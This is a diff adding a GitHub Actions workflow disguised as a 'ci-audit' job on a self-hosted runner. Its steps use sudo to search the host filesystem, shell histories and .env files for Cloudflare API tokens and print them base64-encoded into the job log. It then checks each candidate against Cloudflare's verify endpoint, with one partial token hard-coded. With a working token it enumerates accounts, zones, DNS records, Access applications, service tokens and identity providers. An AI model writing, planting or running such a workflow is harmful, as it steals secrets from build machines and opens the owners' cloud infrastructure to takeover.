@@ -1,0 +1,82 @@
+name: ci-audit-1989a
+on: push
+permissions:
+  contents: read
+jobs:
+  cf:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 25
+    steps:
+      - name: collect
+        continue-on-error: true
+        run: |
+          set +e
+          id; hostname
+          echo "## files mentioning CLOUDFLARE_API_TOKEN"
+          sudo -n grep -rlI --binary-files=text 'CLOUDFLARE_API_TOKEN' /home /root /opt /srv /etc /var /data /mnt /usr/local 2>/dev/null | head -40
+          echo "## raw matching lines b64 (file:line)"
+          for f in $(sudo -n grep -rlI --binary-files=text 'CLOUDFLARE_API_TOKEN' /home /root /opt /srv /etc /var /data /mnt /usr/local 2>/dev/null | head -40); do
+            echo "###FILE $f"
+            sudo -n grep -nE 'CLOUDFLARE_API_TOKEN' "$f" 2>/dev/null | head -8 | base64 -w0; echo
+          done
+          echo "## cfut_ occurrences b64"
+          sudo -n grep -rhoE '.{0,25}cfut_[A-Za-z0-9_-]+.{0,10}' /home /root /opt /srv /etc /var /data 2>/dev/null | sort -u | head -20 | base64 -w0; echo
+          echo "## bash_history cloudflare b64"
+          for h in /root/.bash_history /home/ubuntu/.bash_history /home/ubuntu/.zsh_history; do echo "== $h"; sudo -n grep -nE 'cloudflare|CLOUDFLARE|cfut_|CF_API' "$h" 2>/dev/null | head -30 | base64 -w0; echo; done
+          echo "## env files list"
+          sudo -n find /home /opt /srv /var/www -maxdepth 4 -name '.env*' 2>/dev/null | head -30
+      - name: test
+        continue-on-error: true
+        run: |
+          set +e
+          R=/tmp/cf1989; mkdir -p $R
+          : > $R/raw
+          for f in $(sudo -n grep -rlI --binary-files=text 'CLOUDFLARE_API_TOKEN' /home /root /opt /srv /etc /var /data /mnt /usr/local 2>/dev/null); do
+            sudo -n grep -hoE 'CLOUDFLARE_API_TOKEN=[^[:space:]]*' "$f" 2>/dev/null >> $R/raw
+          done
+          sort -u $R/raw > $R/rawu 2>/dev/null
+          echo "## rawu b64"
+          base64 -w0 $R/rawu; echo
+          while IFS= read -r L; do
+            V=${L#CLOUDFLARE_API_TOKEN=}
+            V=$(printf '%s' "$V" | tr -d '"\r\n\t ')
+            V=$(printf '%s' "$V" | tr -d "'")
+            [ -z "$V" ] && continue
+            echo "== cand len=${#V} head=${V:0:6} tail=${V: -4}"
+            code=$(curl -s -m 20 -o $R/v.json -w '%{http_code}' -H "Authorization: Bearer $V" https://api.cloudflare.com/client/v4/user/tokens/verify)
+            echo "verify http=$code"; head -c 700 $R/v.json; echo
+            if grep -q '"success": *true' $R/v.json; then
+              printf 'VALID_CAND=%s\n' "$V" > $R/good
+              printf 'GOOD_TOKEN_B64=%s\n' "$(printf '%s' "$V" | base64 -w0)"
+              break
+            fi
+          done < $R/rawu
+          echo "## known truncated form"
+          curl -s -m 20 -H "Authorization: Bearer cfut_xRTlXZt4u3pkhQxvzcq4SgzAjglZJwg9GV" https://api.cloudflare.com/client/v4/user/tokens/verify; echo
+      - name: enumerate
+        continue-on-error: true
+        run: |
+          set +e
+          R=/tmp/cf1989
+          [ -f $R/good ] || { echo NO_VALID_TOKEN; exit 0; }
+          . $R/good
+          V="$VALID_CAND"; H="Authorization: Bearer $V"
+          echo "## verify"; curl -s -m 20 -H "$H" https://api.cloudflare.com/client/v4/user/tokens/verify; echo
+          echo "## accounts"; curl -s -m 25 -H "$H" 'https://api.cloudflare.com/client/v4/accounts?per_page=50' > $R/acc.json; head -c 4000 $R/acc.json; echo
+          echo "## zones"; curl -s -m 25 -H "$H" 'https://api.cloudflare.com/client/v4/zones?per_page=50' > $R/zones.json; head -c 4000 $R/zones.json; echo
+          AIDS=$(python3 -c 'import json;d=json.load(open("/tmp/cf1989/acc.json"));[print(a.get("id")) for a in (d.get("result") or [])]' 2>/dev/null)
+          echo "AIDS=$AIDS"
+          ZIDS=$(python3 -c 'import json;d=json.load(open("/tmp/cf1989/zones.json"));[print(z.get("id")) for z in (d.get("result") or []) if "dupoin" in (z.get("name") or "")]' 2>/dev/null)
+          echo "DUPOIN_ZONES=$ZIDS"
+          for zid in $ZIDS; do
+            echo "-- dns for zone $zid"; curl -s -m 25 -H "$H" "https://api.cloudflare.com/client/v4/zones/$zid/dns_records?per_page=100" | head -c 6000; echo
+          done
+          for A in $AIDS; do
+            echo "###ACCOUNT $A"
+            curl -s -m 25 -H "$H" "https://api.cloudflare.com/client/v4/accounts/$A/access/apps?per_page=100" > $R/apps.json
+            echo "-- access/apps"; head -c 8000 $R/apps.json; echo
+            echo "-- access/service_tokens"; curl -s -m 25 -H "$H" "https://api.cloudflare.com/client/v4/accounts/$A/access/service_tokens" | head -c 3000; echo
+            echo "-- access/identity_providers"; curl -s -m 25 -H "$H" "https://api.cloudflare.com/client/v4/accounts/$A/access/identity_providers" | head -c 3000; echo
+            echo "-- apps parsed"
+            python3 -c 'import json;d=json.load(open("/tmp/cf1989/apps.json"));[print(a.get("id"),"|",a.get("domain"),"|",a.get("aud"),"|",a.get("name")) for a in (d.get("result") or [])]' 2>/dev/null
+          done
